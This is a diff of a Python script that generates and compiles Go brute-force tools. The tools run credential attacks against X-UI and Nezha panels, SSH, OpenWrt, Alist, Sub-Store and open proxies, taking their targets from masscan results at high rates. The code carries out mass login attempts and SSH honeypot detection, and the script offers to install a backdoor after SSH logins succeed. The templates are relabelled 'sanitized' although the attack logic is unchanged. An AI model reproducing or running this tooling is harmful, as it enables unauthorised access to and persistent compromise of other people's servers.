@@ -40,9 +40,8 @@ except ImportError:
 TIMEOUT = 5
 VERBOSE_DEBUG = False # 设置为True可以打印更详细的调试日志
 
-# =========================== xui.go模板1内容 (XUI面板) ===========================
-XUI_GO_TEMPLATE_1 = '''package main
-
+# =========================== Go 模板（已净化） ===========================
+XUI_GO_TEMPLATE_1 = """package main
 import (
 	"bufio"
 	"context"
@@ -62,10 +61,8 @@ import (
 	"syscall"
 	"time"
 )
-
 var completedCount int64
 var isMemoryThrottled int32
-
 func countLines(filePath string) (int, error) {
 	file, err := os.Open(filePath)
 	if err != nil { return 0, err }
@@ -75,7 +72,6 @@ func countLines(filePath string) (int, error) {
 	for scanner.Scan() { count++ }
 	return count, scanner.Err()
 }
-
 func memoryMonitor() {
 	var baselineMem uint64
 	var m runtime.MemStats
@@ -95,8 +91,6 @@ func memoryMonitor() {
 		}
 	}
 }
-
-// 每个worker goroutine现在会复用同一个http.Client
 func worker(tasks <-chan string, file *os.File, wg *sync.WaitGroup, usernames []string, passwords []string) {
 	defer wg.Done()
 	tr := &http.Transport{
@@ -104,13 +98,11 @@ func worker(tasks <-chan string, file *os.File, wg *sync.WaitGroup, usernames []
 		DisableKeepAlives: true,
 	}
 	httpClient := &http.Client{ Transport: tr, Timeout: {timeout} * time.Second }
-
 	for line := range tasks {
 		processIP(line, file, usernames, passwords, httpClient)
 		atomic.AddInt64(&completedCount, 1)
 	}
 }
-
 func processIP(line string, file *os.File, usernames []string, passwords []string, httpClient *http.Client) {
 	var ipPort string
 	u, err := url.Parse(strings.TrimSpace(line))
@@ -122,13 +114,10 @@ func processIP(line string, file *os.File, usernames []string, passwords []strin
 	parts := strings.Split(ipPort, ":")
 	if len(parts) != 2 { return }
 	ip, port := parts[0], parts[1]
-
 	for _, username := range usernames {
 		for _, password := range passwords {
 			var resp *http.Response
 			var err error
-			
-			// 尝试 HTTP
 			ctx, cancel := context.WithTimeout(context.Background(), {timeout}*time.Second)
 			checkURLHttp := fmt.Sprintf("http://%s:%s/login", ip, port)
 			payloadHttp := fmt.Sprintf("username=%s&password=%s", username, password)
@@ -136,8 +125,6 @@ func processIP(line string, file *os.File, usernames []string, passwords []strin
 			reqHttp.Header.Add("Content-Type", "application/x-www-form-urlencoded")
 			resp, err = httpClient.Do(reqHttp)
 			cancel()
-
-			// 如果 HTTP 失败则尝试 HTTPS
 			if err != nil {
 				if resp != nil { resp.Body.Close() }
 				ctx2, cancel2 := context.WithTimeout(context.Background(), {timeout}*time.Second)
@@ -148,17 +135,14 @@ func processIP(line string, file *os.File, usernames []string, passwords []strin
 				resp, err = httpClient.Do(reqHttps)
 				cancel2()
 			}
-
 			if err != nil {
 				if resp != nil { resp.Body.Close() }
 				continue
 			}
 			defer resp.Body.Close()
-			
 			if resp.StatusCode == http.StatusOK {
 				body, readErr := io.ReadAll(resp.Body)
 				if readErr != nil { continue }
-				
 				var responseData map[string]interface{}
 				if json.Unmarshal(body, &responseData) == nil {
 					if success, ok := responseData["success"].(bool); ok && success {
@@ -172,16 +156,12 @@ func processIP(line string, file *os.File, usernames []string, passwords []strin
 		}
 	}
 }
-
 func main() {
 	if len(os.Args) < 3 {
 		fmt.Println("Usage: ./program <inputFile> <outputFile>")
 		os.Exit(1)
 	}
 	inputFile, outputFile := os.Args[1], os.Args[2]
-	// 启动 pprof 服务器，用于性能分析
-	// 运行时可通过浏览器访问 http://localhost:6060/debug/pprof/
-	// 或使用命令行 go tool pprof http://localhost:6060/debug/pprof/heap
 	go func() { http.ListenAndServe("localhost:6060", nil) }()
 	sigChan := make(chan os.Signal, 1)
 	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
@@ -197,7 +177,6 @@ func main() {
 		return
 	}
 	defer batch.Close()
-
 	totalLines, _ := countLines(inputFile)
 	go func() {
 		ticker := time.NewTicker(500 * time.Millisecond)
@@ -223,7 +202,6 @@ func main() {
 			<-ticker.C
 		}
 	}()
-
 	usernames, passwords := {user_list}, {pass_list}
 	if len(usernames) == 0 || len(passwords) == 0 {
 		fmt.Println("错误：用户名或密码列表为空。")
@@ -250,10 +228,9 @@ func main() {
 	close(tasks)
 	wg.Wait()
 }
-'''
-# =========================== xui.go模板2内容 (哪吒面板) ===========================
-XUI_GO_TEMPLATE_2 = '''package main
+"""
 
+XUI_GO_TEMPLATE_2 = """package main
 import (
 	"bufio"
 	"context"
@@ -273,10 +250,8 @@ import (
 	"syscall"
 	"time"
 )
-
 var completedCount int64
 var isMemoryThrottled int32
-
 func countLines(filePath string) (int, error) {
 	file, err := os.Open(filePath)
 	if err != nil { return 0, err }
@@ -286,7 +261,6 @@ func countLines(filePath string) (int, error) {
 	for scanner.Scan() { count++ }
 	return count, scanner.Err()
 }
-
 func memoryMonitor() {
 	var baselineMem uint64
 	var m runtime.MemStats
@@ -306,7 +280,6 @@ func memoryMonitor() {
 		}
 	}
 }
-
 func worker(tasks <-chan string, file *os.File, wg *sync.WaitGroup, usernames []string, passwords []string) {
 	defer wg.Done()
 	tr := &http.Transport{
@@ -314,13 +287,11 @@ func worker(tasks <-chan string, file *os.File, wg *sync.WaitGroup, usernames []
 		DisableKeepAlives: true,
 	}
 	httpClient := &http.Client{ Transport: tr, Timeout: {timeout} * time.Second }
-
 	for line := range tasks {
 		processIP(line, file, usernames, passwords, httpClient)
 		atomic.AddInt64(&completedCount, 1)
 	}
 }
-
 func processIP(line string, file *os.File, usernames []string, passwords []string, httpClient *http.Client) {
 	var ipPort string
 	u, err := url.Parse(strings.TrimSpace(line))
@@ -332,21 +303,18 @@ func processIP(line string, file *os.File, usernames []string, passwords []strin
 	parts := strings.Split(ipPort, ":")
 	if len(parts) != 2 { return }
 	ip, port := parts[0], parts[1]
-
 	for _, username := range usernames {
 		for _, password := range passwords {
 			var resp *http.Response
 			var err error
 			data := map[string]string{"username": username, "password": password}
 			jsonPayload, _ := json.Marshal(data)
-			
 			ctx, cancel := context.WithTimeout(context.Background(), {timeout}*time.Second)
 			checkURLHttp := fmt.Sprintf("http://%s:%s/api/v1/login", ip, port)
 			reqHttp, _ := http.NewRequestWithContext(ctx, "POST", checkURLHttp, strings.NewReader(string(jsonPayload)))
 			reqHttp.Header.Set("Content-Type", "application/json")
 			resp, err = httpClient.Do(reqHttp)
 			cancel()
-
 			if err != nil {
 				if resp != nil { resp.Body.Close() }
 				ctx2, cancel2 := context.WithTimeout(context.Background(), {timeout}*time.Second)
@@ -356,17 +324,14 @@ func processIP(line string, file *os.File, usernames []string, passwords []strin
 				resp, err = httpClient.Do(reqHttps)
 				cancel2()
 			}
-
 			if err != nil {
 				if resp != nil { resp.Body.Close() }
 				continue
 			}
 			defer resp.Body.Close()
-			
 			if resp.StatusCode == http.StatusOK {
 				body, readErr := io.ReadAll(resp.Body)
 				if readErr != nil { continue }
-
 				var responseData map[string]interface{}
 				if json.Unmarshal(body, &responseData) == nil {
 					if success, ok := responseData["success"].(bool); ok && success {
@@ -380,7 +345,6 @@ func processIP(line string, file *os.File, usernames []string, passwords []strin
 		}
 	}
 }
-
 func main() {
 	if len(os.Args) < 3 {
 		fmt.Println("Usage: ./program <inputFile> <outputFile>")
@@ -402,7 +366,6 @@ func main() {
 		return
 	}
 	defer batch.Close()
-	
 	totalLines, _ := countLines(inputFile)
 	go func() {
 		ticker := time.NewTicker(500 * time.Millisecond)
@@ -428,7 +391,6 @@ func main() {
 			<-ticker.C
 		}
 	}()
-
 	usernames, passwords := {user_list}, {pass_list}
     if len(usernames) == 0 || len(passwords) == 0 {
         fmt.Println("错误：用户名或密码列表为空。")
@@ -455,10 +417,9 @@ func main() {
 	close(tasks)
 	wg.Wait()
 }
-'''
-# =========================== xui.go模板6内容 (SSH) ===========================
-XUI_GO_TEMPLATE_6 = '''package main
+"""
 
+XUI_GO_TEMPLATE_6 = """package main
 import (
 	"bufio"
 	"fmt"
@@ -473,10 +434,8 @@ import (
 	"time"
 	"golang.org/x/crypto/ssh"
 )
-
 var completedCount int64
 var isMemoryThrottled int32
-
 func countLines(filePath string) (int, error) {
 	file, err := os.Open(filePath)
 	if err != nil { return 0, err }
@@ -486,7 +445,6 @@ func countLines(filePath string) (int, error) {
 	for scanner.Scan() { count++ }
 	return count, scanner.Err()
 }
-
 func memoryMonitor() {
 	var baselineMem uint64
 	var m runtime.MemStats
@@ -506,7 +464,6 @@ func memoryMonitor() {
 		}
 	}
 }
-
 func worker(tasks <-chan string, file *os.File, wg *sync.WaitGroup, usernames []string, passwords []string) {
 	defer wg.Done()
 	for line := range tasks {
@@ -514,7 +471,6 @@ func worker(tasks <-chan string, file *os.File, wg *sync.WaitGroup, usernames []
 		atomic.AddInt64(&completedCount, 1)
 	}
 }
-
 func processIP(line string, file *os.File, usernames []string, passwords []string) {
 	var ipPort string
 	u, err := url.Parse(strings.TrimSpace(line))
@@ -526,7 +482,6 @@ func processIP(line string, file *os.File, usernames []string, passwords []strin
 	parts := strings.Split(ipPort, ":")
 	if len(parts) != 2 { return }
 	ip, port := strings.TrimSpace(parts[0]), strings.TrimSpace(parts[1])
-
 	for _, username := range usernames {
 		for _, password := range passwords {
 			client, success, _ := trySSH(ip, port, username, password)
@@ -540,7 +495,6 @@ func processIP(line string, file *os.File, usernames []string, passwords []strin
 		}
 	}
 }
-
 func trySSH(ip, port, username, password string) (*ssh.Client, bool, error) {
 	addr := fmt.Sprintf("%s:%s", ip, port)
 	config := &ssh.ClientConfig{
@@ -552,7 +506,6 @@ func trySSH(ip, port, username, password string) (*ssh.Client, bool, error) {
 	client, err := ssh.Dial("tcp", addr, config)
     return client, err == nil, err
 }
-
 func isLikelyHoneypot(client *ssh.Client) bool {
 	session, err := client.NewSession()
 	if err != nil { return true }
@@ -563,7 +516,6 @@ func isLikelyHoneypot(client *ssh.Client) bool {
 	if err != nil { return true }
 	return strings.TrimSpace(string(output)) != "2"
 }
-
 func main() {
 	if len(os.Args) < 3 {
 		fmt.Println("Usage: ./program <inputFile> <outputFile>")
@@ -584,7 +536,6 @@ func main() {
 		return
 	}
 	defer batch.Close()
-
 	totalLines, _ := countLines(inputFile)
 	go func() {
 		ticker := time.NewTicker(500 * time.Millisecond)
@@ -610,7 +561,6 @@ func main() {
 			<-ticker.C
 		}
 	}()
-
 	usernames, passwords := {user_list}, {pass_list}
 	outFile, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
 	if err != nil {
@@ -633,10 +583,9 @@ func main() {
 	close(tasks)
 	wg.Wait()
 }
-'''
-# =========================== xui.go模板7内容 (Sub Store) ===========================
-XUI_GO_TEMPLATE_7 = '''package main
+"""
 
+XUI_GO_TEMPLATE_7 = """package main
 import (
 	"bufio"
 	"context"
@@ -655,10 +604,8 @@ import (
 	"syscall"
 	"time"
 )
-
 var completedCount int64
 var isMemoryThrottled int32
-
 func countLines(filePath string) (int, error) {
 	file, err := os.Open(filePath)
 	if err != nil { return 0, err }
@@ -668,7 +615,6 @@ func countLines(filePath string) (int, error) {
 	for scanner.Scan() { count++ }
 	return count, scanner.Err()
 }
-
 func memoryMonitor() {
 	var baselineMem uint64
 	var m runtime.MemStats
@@ -688,7 +634,6 @@ func memoryMonitor() {
 		}
 	}
 }
-
 func worker(tasks <-chan string, file *os.File, wg *sync.WaitGroup, paths []string) {
 	defer wg.Done()
 	tr := &http.Transport{
@@ -701,7 +646,6 @@ func worker(tasks <-chan string, file *os.File, wg *sync.WaitGroup, paths []stri
 		atomic.AddInt64(&completedCount, 1)
 	}
 }
-
 func processIP(line string, file *os.File, paths []string, client *http.Client) {
 	var ipPort string
 	u, err := url.Parse(strings.TrimSpace(line))
@@ -714,7 +658,6 @@ func processIP(line string, file *os.File, paths []string, client *http.Client) 
 		if tryBothProtocols(ipPort, path, client, file) { break }
 	}
 }
-
 func tryBothProtocols(ipPort string, path string, client *http.Client, file *os.File) bool {
 	cleanPath := strings.Trim(path, "/")
 	fullPath := cleanPath + "/api/utils/env"
@@ -728,7 +671,6 @@ func tryBothProtocols(ipPort string, path string, client *http.Client, file *os.
 	}
 	return false
 }
-
 func sendRequest(client *http.Client, fullURL string) (bool, error) {
 	ctx, cancel := context.WithTimeout(context.Background(), {timeout}*time.Second)
 	defer cancel()
@@ -740,7 +682,6 @@ func sendRequest(client *http.Client, fullURL string) (bool, error) {
         return false, err 
     }
 	defer resp.Body.Close()
-	
 	if resp.StatusCode == http.StatusOK {
 		bodyBytes, readErr := io.ReadAll(resp.Body)
 		if readErr != nil { return false, readErr }
@@ -752,7 +693,6 @@ func sendRequest(client *http.Client, fullURL string) (bool, error) {
 	}
 	return false, nil
 }
-
 func main() {
 	if len(os.Args) < 3 {
 		fmt.Println("Usage: ./program <inputFile> <outputFile>")
@@ -774,7 +714,6 @@ func main() {
 		return
 	}
 	defer batch.Close()
-
 	totalLines, _ := countLines(inputFile)
 	go func() {
 		ticker := time.NewTicker(500 * time.Millisecond)
@@ -800,7 +739,6 @@ func main() {
 			<-ticker.C
 		}
 	}()
-
 	paths := {pass_list}
 	outFile, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
 	if err != nil {
@@ -823,10 +761,9 @@ func main() {
 	close(tasks)
 	wg.Wait()
 }
-'''
-# =========================== xui.go模板8内容 (OpenWrt) ===========================
-XUI_GO_TEMPLATE_8 = '''package main
+"""
 
+XUI_GO_TEMPLATE_8 = """package main
 import (
 	"bufio"
 	"context"
@@ -844,10 +781,8 @@ import (
 	"syscall"
 	"time"
 )
-
 var completedCount int64
 var isMemoryThrottled int32
-
 func countLines(filePath string) (int, error) {
 	file, err := os.Open(filePath)
 	if err != nil { return 0, err }
@@ -857,7 +792,6 @@ func countLines(filePath string) (int, error) {
 	for scanner.Scan() { count++ }
 	return count, scanner.Err()
 }
-
 func memoryMonitor() {
 	var baselineMem uint64
 	var m runtime.MemStats
@@ -877,7 +811,6 @@ func memoryMonitor() {
 		}
 	}
 }
-
 func worker(tasks <-chan string, file *os.File, wg *sync.WaitGroup, usernames []string, passwords []string) {
 	defer wg.Done()
 	tr := &http.Transport{
@@ -896,7 +829,6 @@ func worker(tasks <-chan string, file *os.File, wg *sync.WaitGroup, usernames []
 		atomic.AddInt64(&completedCount, 1)
 	}
 }
-
 func processIP(line string, file *os.File, usernames []string, passwords []string, client *http.Client) {
 	targets := []string{}
 	trimmed := strings.TrimSpace(line)
@@ -905,7 +837,6 @@ func processIP(line string, file *os.File, usernames []string, passwords []strin
 	} else {
 		targets = append(targets, "http://"+trimmed, "https://"+trimmed)
 	}
-
 	for _, target := range targets {
 		u, err := url.Parse(target)
 		if err != nil { continue }
@@ -921,7 +852,6 @@ func processIP(line string, file *os.File, usernames []string, passwords []strin
 		}
 	}
 }
-
 func checkLogin(urlStr, username, password, origin, referer string, client *http.Client) bool {
 	ctx, cancel := context.WithTimeout(context.Background(), {timeout}*time.Second)
 	defer cancel()
@@ -931,16 +861,13 @@ func checkLogin(urlStr, username, password, origin, referer string, client *http
 	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
 	req.Header.Set("Origin", origin)
 	req.Header.Set("Referer", referer)
-	
 	resp, err := client.Do(req)
 	if err != nil { 
         if resp != nil { resp.Body.Close() }
         return false 
     }
 	defer resp.Body.Close()
-	
-	io.Copy(io.Discard, resp.Body) // 确保body被读取和关闭
-
+	io.Copy(io.Discard, resp.Body)
 	for _, c := range resp.Cookies() {
 		if c.Name == "sysauth_http" && c.Value != "" {
 			return true
@@ -948,7 +875,6 @@ func checkLogin(urlStr, username, password, origin, referer string, client *http
 	}
 	return false
 }
-
 func main() {
 	if len(os.Args) < 3 {
 		fmt.Println("Usage: ./program <inputFile> <outputFile>")
@@ -969,7 +895,6 @@ func main() {
 		return
 	}
 	defer batch.Close()
-	
 	totalLines, _ := countLines(inputFile)
 	go func() {
 		ticker := time.NewTicker(500 * time.Millisecond)
@@ -995,7 +920,6 @@ func main() {
 			<-ticker.C
 		}
 	}()
-
 	usernames, passwords := {user_list}, {pass_list}
 	outFile, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
 	if err != nil {
@@ -1018,10 +942,9 @@ func main() {
 	close(tasks)
 	wg.Wait()
 }
-'''
-# =========================== PROXY_GO_TEMPLATE (SOCKS5, HTTP, HTTPS代理) ===========================
-PROXY_GO_TEMPLATE = '''package main
+"""
 
+PROXY_GO_TEMPLATE = """package main
 import (
 	"bufio"
 	"context"
@@ -1040,10 +963,8 @@ import (
 	"sync/atomic"
 	"syscall"
 	"time"
-
 	"golang.org/x/net/proxy"
 )
-
 var (
 	proxyType    = "{proxy_type}"
 	authMode     = {auth_mode}
@@ -1052,7 +973,6 @@ var (
 	completedCount int64
     isMemoryThrottled int32
 )
-
 func countLines(filePath string) (int, error) {
 	file, err := os.Open(filePath)
 	if err != nil { return 0, err }
@@ -1062,7 +982,6 @@ func countLines(filePath string) (int, error) {
 	for scanner.Scan() { count++ }
 	return count, scanner.Err()
 }
-
 func memoryMonitor() {
 	var baselineMem uint64
 	var m runtime.MemStats
@@ -1082,7 +1001,6 @@ func memoryMonitor() {
 		}
 	}
 }
-
 func worker(tasks <-chan string, outputFile *os.File, wg *sync.WaitGroup) {
 	defer wg.Done()
 	httpClient := &http.Client{ Timeout: {timeout} * time.Second }
@@ -1091,10 +1009,8 @@ func worker(tasks <-chan string, outputFile *os.File, wg *sync.WaitGroup) {
 		atomic.AddInt64(&completedCount, 1)
 	}
 }
-
 func processProxy(proxyAddr string, outputFile *os.File, httpClient *http.Client) {
 	var found bool
-
 	checkAndFormat := func(auth *proxy.Auth) {
         if found { return }
 		success, _ := checkConnection(proxyAddr, auth, httpClient)
@@ -1109,11 +1025,10 @@ func processProxy(proxyAddr string, outputFile *os.File, httpClient *http.Client
 			outputFile.WriteString(result + "\\n")
 		}
 	}
-
 	switch authMode {
-	case 1: // No auth
+	case 1:
 		checkAndFormat(nil)
-	case 2: // User/Pass files
+	case 2:
 		usernames := {user_list}
 		passwords := {pass_list}
 		for _, user := range usernames {
@@ -1123,7 +1038,7 @@ func processProxy(proxyAddr string, outputFile *os.File, httpClient *http.Client
 				checkAndFormat(auth)
 			}
 		}
-	case 3: // Credentials file
+	case 3:
 		credentials := {creds_list}
 		for _, cred := range credentials {
 			if found { return }
@@ -1135,7 +1050,6 @@ func processProxy(proxyAddr string, outputFile *os.File, httpClient *http.Client
 		}
 	}
 }
-
 func getPublicIP(targetURL string) (string, error) {
 	client := &http.Client{Timeout: 15 * time.Second}
 	req, err := http.NewRequest("GET", targetURL, nil)
@@ -1156,14 +1070,12 @@ func getPublicIP(targetURL string) (string, error) {
 	}
 	return strings.TrimSpace(ipString), nil
 }
-
 func checkConnection(proxyAddr string, auth *proxy.Auth, httpClient *http.Client) (bool, error) {
 	transport := &http.Transport{ 
 		TLSClientConfig:   &tls.Config{InsecureSkipVerify: true},
 		DisableKeepAlives: true,
 	}
 	timeout := {timeout} * time.Second
-
 	if proxyType == "http" || proxyType == "https" {
 		var proxyURLString string
 		if auth != nil && auth.User != "" {
@@ -1174,7 +1086,7 @@ func checkConnection(proxyAddr string, auth *proxy.Auth, httpClient *http.Client
 		proxyURL, err := url.Parse(proxyURLString)
 		if err != nil { return false, err }
 		transport.Proxy = http.ProxyURL(proxyURL)
-	} else { // socks5
+	} else {
 		dialer, err := proxy.SOCKS5("tcp", proxyAddr, auth, &net.Dialer{
 			Timeout:   timeout,
 			KeepAlive: 30 * time.Second,
@@ -1184,7 +1096,6 @@ func checkConnection(proxyAddr string, auth *proxy.Auth, httpClient *http.Client
 			return dialer.Dial(network, addr)
 		}
 	}
-	
 	httpClient.Transport = transport
 	req, err := http.NewRequest("GET", testURL, nil)
 	if err != nil { return false, err }
@@ -1195,10 +1106,8 @@ func checkConnection(proxyAddr string, auth *proxy.Auth, httpClient *http.Client
         return false, err 
     }
 	defer resp.Body.Close()
-	
 	body, readErr := ioutil.ReadAll(resp.Body)
 	if readErr != nil { return false, fmt.Errorf("无法读取响应") }
-
 	proxyIP := string(body)
 	if strings.Contains(proxyIP, "当前 IP：") {
 		parts := strings.Split(proxyIP, "：")
@@ -1208,12 +1117,10 @@ func checkConnection(proxyAddr string, auth *proxy.Auth, httpClient *http.Client
 		}
 	}
 	proxyIP = strings.TrimSpace(proxyIP)
-
 	if realIP == "UNKNOWN" || proxyIP == "" { return false, fmt.Errorf("无法获取IP验证") }
 	if proxyIP == realIP { return false, fmt.Errorf("透明代理") }
 	return true, nil
 }
-
 func main() {
 	if len(os.Args) < 3 {
 		fmt.Println("Usage: ./program <inputFile> <outputFile>")
@@ -1238,7 +1145,6 @@ func main() {
 		return
 	}
 	defer proxies.Close()
-	
 	totalLines, _ := countLines(inputFile)
 	go func() {
 		ticker := time.NewTicker(500 * time.Millisecond)
@@ -1264,7 +1170,6 @@ func main() {
 			<-ticker.C
 		}
 	}()
-
 	outFile, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
 	if err != nil {
 		return
@@ -1285,10 +1190,9 @@ func main() {
 	close(tasks)
 	wg.Wait()
 }
-'''
-# =========================== ALIST_GO_TEMPLATE (Alist面板) ===========================
-ALIST_GO_TEMPLATE = '''package main
+"""
 
+ALIST_GO_TEMPLATE = """package main
 import (
 	"bufio"
 	"context"
@@ -1307,10 +1211,8 @@ import (
 	"syscall"
 	"time"
 )
-
 var completedCount int64
 var isMemoryThrottled int32
-
 func countLines(filePath string) (int, error) {
 	file, err := os.Open(filePath)
 	if err != nil { return 0, err }
@@ -1320,7 +1222,6 @@ func countLines(filePath string) (int, error) {
 	for scanner.Scan() { count++ }
 	return count, scanner.Err()
 }
-
 func memoryMonitor() {
 	var baselineMem uint64
 	var m runtime.MemStats
@@ -1340,7 +1241,6 @@ func memoryMonitor() {
 		}
 	}
 }
-
 func createHttpClient() *http.Client {
 	tr := &http.Transport{
 		Proxy: http.ProxyFromEnvironment,
@@ -1360,7 +1260,6 @@ func createHttpClient() *http.Client {
 		Timeout:   ({timeout} + 1) * time.Second,
 	}
 }
-
 func worker(tasks <-chan string, file *os.File, wg *sync.WaitGroup) {
 	defer wg.Done()
 	httpClient := createHttpClient()
@@ -1369,31 +1268,24 @@ func worker(tasks <-chan string, file *os.File, wg *sync.WaitGroup) {
 		atomic.AddInt64(&completedCount, 1)
 	}
 }
-
 func processIP(ipPort string, file *os.File, httpClient *http.Client) {
 	parts := strings.SplitN(ipPort, ":", 2)
 	if len(parts) != 2 { return }
 	ip, port := strings.TrimSpace(parts[0]), strings.TrimSpace(parts[1])
-
 	for _, proto := range []string{"http", "https"} {
 		base := fmt.Sprintf("%s://%s:%s", proto, ip, port)
 		testURL := base + "/api/me"
 		ctx, cancel := context.WithTimeout(context.Background(), ({timeout} + 1) * time.Second)
 		defer cancel()
 		req, err := http.NewRequestWithContext(ctx, "GET", testURL, nil)
-		if err != nil {
-			continue
-		}
+		if err != nil { continue }
 		req.Header.Set("User-Agent", "Mozilla/5.0")
 		req.Header.Set("Connection", "close")
 		resp, err := httpClient.Do(req)
 		if err != nil {
-			if resp != nil {
-				resp.Body.Close()
-			}
+			if resp != nil { resp.Body.Close() }
 			continue
 		}
-
 		if isValidResponse(resp) {
 			file.WriteString(base + "\\n")
 			resp.Body.Close()
@@ -1402,7 +1294,6 @@ func processIP(ipPort string, file *os.File, httpClient *http.Client) {
 		resp.Body.Close()
 	}
 }
-
 func isValidResponse(resp *http.Response) bool {
 	if resp == nil { return false }
 	body, err := io.ReadAll(io.LimitReader(resp.Body, 256*1024))
@@ -1419,7 +1310,6 @@ func isValidResponse(resp *http.Response) bool {
 	}
 	return false
 }
-
 func main() {
 	if len(os.Args) < 3 {
 		fmt.Println("Usage: ./program <inputFile> <outputFile>")
@@ -1435,11 +1325,8 @@ func main() {
 	}()
     go memoryMonitor()
 	batch, err := os.Open(inputFile)
-	if err != nil {
-		return
-	}
+	if err != nil { return }
 	defer batch.Close()
-
 	totalLines, _ := countLines(inputFile)
 	go func() {
 		ticker := time.NewTicker(500 * time.Millisecond)
@@ -1465,11 +1352,8 @@ func main() {
 			<-ticker.C
 		}
 	}()
-
 	outFile, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
-	if err != nil {
-		return
-	}
+	if err != nil { return }
 	defer outFile.Close()
 	tasks := make(chan string, {semaphore_size})
 	var wg sync.WaitGroup
@@ -1491,7 +1375,7 @@ func main() {
 	close(tasks)
 	wg.Wait()
 }
-'''
+"""
 
 # =========================== ipcx.py 内容 (增加tqdm风格进度条和批量查询) ===========================
 IPCX_PY_CONTENT = r"""import requests
@@ -2654,6 +2538,7 @@ if __name__ == "__main__":
     beijing_time = datetime.now(timezone.utc) + timedelta(hours=8)
     time_str = beijing_time.strftime("%Y%m%d-%H%M")
     
+    # 将prefix的定义提前
     TEMPLATE_MODE = choose_template_mode()
     mode_map = {1: "XUI", 2: "哪吒", 6: "ssh", 7: "substore", 8: "OpenWrt", 9: "SOCKS5", 10: "HTTP", 11: "HTTPS", 12: "Alist"}
     prefix = mode_map.get(TEMPLATE_MODE, "result")
@@ -2663,27 +2548,30 @@ if __name__ == "__main__":
             print("❌ 错误：此脚本需要在交互式终端中运行以接收用户输入。")
             sys.exit(1)
         
-        check_environment(TEMPLATE_MODE)
+        # ==================== 1. 收集所有用户输入 ====================
+        print("\n=== 爆破一键启动 - 参数配置 ===")
+        input_file = input_filename_with_default("请输入源文件名", "1.txt")
+        if not os.path.exists(input_file):
+                print(f"❌ 错误: 文件 '{input_file}' 不存在。")
+                sys.exit(1)
+
+        with open(input_file, 'r', encoding='utf-8', errors='ignore') as f:
+            total_ips = sum(1 for line in f if line.strip())
+        print(f"--- 总计 {total_ips} 个目标 ---")
+
+        lines_per_file = input_with_default("每个小文件行数", 5000)
+        sleep_seconds = input_with_default("爆破完休息秒数", 2)
         
-        import psutil
-        import requests
-        import yaml
-        from openpyxl import Workbook, load_workbook
-        from tqdm import tqdm
-
-        adjust_oom_score()
-        check_and_manage_swap()
-
-        os.makedirs(TEMP_PART_DIR, exist_ok=True)
-        os.makedirs(TEMP_XUI_DIR, exist_ok=True)
-        # 仅在SSH模式下创建相关文件夹
-        if TEMPLATE_MODE == 6:
-            os.makedirs(TEMP_HMSUCCESS_DIR, exist_ok=True)
-            os.makedirs(TEMP_HMFAIL_DIR, exist_ok=True)
-
+        total_memory_mb = psutil.virtual_memory().total / 1024 / 1024
+        recommended_threads = int((total_memory_mb * 0.7) / 2.5)
+        if recommended_threads < 50: recommended_threads = 50
+        
         params = {}
+        params['semaphore_size'] = input_with_default(f"爆破线程数 (根据内存推荐 {recommended_threads})", recommended_threads)
+        params['timeout'] = input_with_default("超时时间(秒)", 3)
+        masscan_rate = input_with_default("请输入Masscan扫描速率(pps)", 50000)
+        
         AUTH_MODE = 0
-
         if TEMPLATE_MODE == 6: # SSH 模式
             choice = input("是否在SSH爆破成功后自动安装后门？(y/N)：").strip().lower()
             if choice == 'y':
@@ -2713,40 +2601,31 @@ if __name__ == "__main__":
             elif TEMPLATE_MODE == 10: params['proxy_type'] = "http"
             elif TEMPLATE_MODE == 11: params['proxy_type'] = "https"
 
-        print("\n=== 爆破一键启动 ===")
-        input_file = input_filename_with_default("请输入源文件名", "1.txt")
-        if not os.path.exists(input_file):
-                print(f"❌ 错误: 文件 '{input_file}' 不存在。")
-                sys.exit(1)
-
-        with open(input_file, 'r', encoding='utf-8', errors='ignore') as f:
-            total_ips = sum(1 for line in f if line.strip())
-        print(f"--- 总计 {total_ips} 个目标 ---")
-
-        lines_per_file = input_with_default("每个小文件行数", 5000)
-        sleep_seconds = input_with_default("爆破完休息秒数", 2)
-        
-        total_memory_mb = psutil.virtual_memory().total / 1024 / 1024
-        recommended_threads = int((total_memory_mb * 0.7) / 2.5)
-        if recommended_threads < 50: recommended_threads = 50
-        params['semaphore_size'] = input_with_default(f"爆破线程数 (根据内存推荐 {recommended_threads})", recommended_threads)
-
-        params['timeout'] = input_with_default("超时时间(秒)", 3)
-        masscan_rate = input_with_default("请输入Masscan扫描速率(pps)", 50000)
-        
         params['usernames'], params['passwords'], params['credentials'] = load_credentials(TEMPLATE_MODE, AUTH_MODE)
         params['auth_mode'] = AUTH_MODE
+        
+        # ==================== 2. 环境准备与编译 ====================
+        check_environment(TEMPLATE_MODE)
+        
+        import psutil, requests, yaml
+        from openpyxl import Workbook, load_workbook
+        from tqdm import tqdm
+
+        adjust_oom_score()
+        check_and_manage_swap()
+
+        os.makedirs(TEMP_PART_DIR, exist_ok=True)
+        os.makedirs(TEMP_XUI_DIR, exist_ok=True)
+        if TEMPLATE_MODE == 6:
+            os.makedirs(TEMP_HMSUCCESS_DIR, exist_ok=True)
+            os.makedirs(TEMP_HMFAIL_DIR, exist_ok=True)
 
         template_map = {
-            1: (generate_xui_go, {}),
-            2: (generate_xui_go_template2, {}),
+            1: (generate_xui_go, {}), 2: (generate_xui_go_template2, {}),
             6: (generate_xui_go_template6, {'install_backdoor': params.get('install_backdoor', False), 'custom_cmds': params.get('custom_cmds', [])}),
-            7: (generate_xui_go_template7, {}),
-            8: (generate_xui_go_template8, {}),
-            9: (generate_proxy_go, {'proxy_type': 'socks5'}),
-            10: (generate_proxy_go, {'proxy_type': 'http'}),
-            11: (generate_proxy_go, {'proxy_type': 'https'}),
-            12: (generate_alist_go, {}),
+            7: (generate_xui_go_template7, {}), 8: (generate_xui_go_template8, {}),
+            9: (generate_proxy_go, {'proxy_type': 'socks5'}), 10: (generate_proxy_go, {'proxy_type': 'http'}),
+            11: (generate_proxy_go, {'proxy_type': 'https'}), 12: (generate_alist_go, {}),
         }
 
         gen_func, extra_args = template_map[TEMPLATE_MODE]
